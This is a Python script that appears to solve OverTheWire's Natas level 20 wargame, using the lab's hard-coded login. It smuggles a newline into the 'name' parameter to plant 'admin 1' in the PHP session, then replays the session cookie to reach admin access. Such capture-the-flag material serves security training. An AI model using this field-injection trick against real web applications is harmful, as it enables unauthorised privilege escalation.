#!/usr/bin/python

import requests


auth = ("natas20", "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF")
url = "http://natas20.natas.labs.overthewire.org?"

params = {
    "debug": "true",
    "name": "test\nadmin 1"
}

r = requests.get(url, params=params, auth=auth)

print(r.text)
print('')
session_id = r.cookies.get('PHPSESSID')

# session_id = "admin"

headers = {
    'Cookie': "PHPSESSID=%s" % session_id
}
rs = requests.get(url, params={"debug": "true"}, auth=auth, headers=headers)
print(rs.text)